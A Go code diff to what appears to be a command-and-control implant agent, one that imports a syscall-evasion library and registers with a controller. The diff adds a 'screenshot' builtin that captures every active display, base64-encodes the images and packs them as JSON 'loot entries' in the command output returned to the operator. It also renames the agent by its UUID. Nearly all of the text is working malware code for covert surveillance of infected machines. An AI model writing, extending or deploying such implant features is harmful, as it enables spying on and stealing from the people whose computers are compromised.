@@ -26,8 +26,10 @@ import (
 	"github.com/google/uuid"
 	"github.com/quic-go/quic-go/http3"
 	"golang.org/x/sys/windows"
+	"image/png"
 
 	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
+	"github.com/kbinani/screenshot"
 )
 
 // Build-time configuration - can be overridden with -ldflags during compilation
@@ -271,15 +273,13 @@ func main() {
 		time.Sleep(time.Duration(initialJitter) * time.Second)
 	}
 
-	agentName := fmt.Sprintf("Agent-%s", agentID[:8])
-
 	osInfo := fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH)
 
 	// Registration loop with full interval backoff on failure
 	for {
 		reg := AgentRegistration{
 			UUID:              agentID,
-			Name:              agentName,
+			Name:              agentID,
 			IP:                getLocalIP(),
 			OS:                osInfo,
 			ReconnectInterval: reconnectInterval,
@@ -509,6 +509,8 @@ func handleBuiltinCommand(command string) (string, error) {
 		return handleRmdir(args)
 	case "jitter":
 		return handleJitter(args)
+	case "screenshot":
+		return handleScreenshot(args)
 	default:
 		return "", fmt.Errorf("not a builtin command")
 	}
@@ -1243,6 +1245,83 @@ func handleJitter(args []string) (string, error) {
 	jitterSeconds = newJitter
 
 	return fmt.Sprintf("Jitter changed from +/- %d to +/- %d seconds", oldJitter, newJitter), nil
+}
+
+// handleScreenshot captures all screens and returns them as loot entries
+func handleScreenshot(args []string) (string, error) {
+	numDisplays := screenshot.NumActiveDisplays()
+	if numDisplays == 0 {
+		return "", fmt.Errorf("no active displays found")
+	}
+
+	var result strings.Builder
+	var lootEntries []map[string]interface{}
+
+	for i := 0; i < numDisplays; i++ {
+		bounds := screenshot.GetDisplayBounds(i)
+		img, err := screenshot.CaptureRect(bounds)
+		if err != nil {
+			continue
+		}
+
+		// Encode image to PNG
+		var buffer strings.Builder
+		pngEncoder := png.Encoder{CompressionLevel: png.DefaultCompression}
+		bufWriter := &bufferWriter{builder: &buffer}
+		
+		if err := pngEncoder.Encode(bufWriter, img); err != nil {
+			continue
+		}
+
+		// Get the raw bytes
+		imageBytes := []byte(buffer.String())
+		
+		// Calculate MD5 hash
+		hash := md5.Sum(imageBytes)
+		hashString := hex.EncodeToString(hash[:])
+		
+		// Generate filename with timestamp
+		timestamp := time.Now().Unix()
+		filename := fmt.Sprintf("screenshot_%d_%d.png", timestamp, i)
+		
+		// Base64 encode the image
+		base64Content := base64.StdEncoding.EncodeToString(imageBytes)
+		
+		// Create loot entry
+		lootEntry := map[string]interface{}{
+			"type":    "file",
+			"name":    filename,
+			"path":    "", // Empty path indicates loose file
+			"size":    float64(len(imageBytes)),
+			"content": base64Content,
+			"md5":     hashString,
+		}
+		
+		lootEntries = append(lootEntries, lootEntry)
+		result.WriteString(fmt.Sprintf("Captured screen %d (%d bytes)\n", i, len(imageBytes)))
+	}
+
+	if len(lootEntries) == 0 {
+		return "", fmt.Errorf("failed to capture any screenshots")
+	}
+
+	// Add loot entries to output
+	lootJSON, err := json.Marshal(lootEntries)
+	if err != nil {
+		return "", fmt.Errorf("failed to marshal loot entries: %v", err)
+	}
+
+	result.WriteString(fmt.Sprintf("\nLOOT_ENTRIES:%s", string(lootJSON)))
+	return result.String(), nil
+}
+
+// bufferWriter wraps strings.Builder to implement io.Writer
+type bufferWriter struct {
+	builder *strings.Builder
+}
+
+func (bw *bufferWriter) Write(p []byte) (n int, err error) {
+	return bw.builder.Write(p)
 }
 
 func sendCommandResponse(commandID int, output, status string) error {
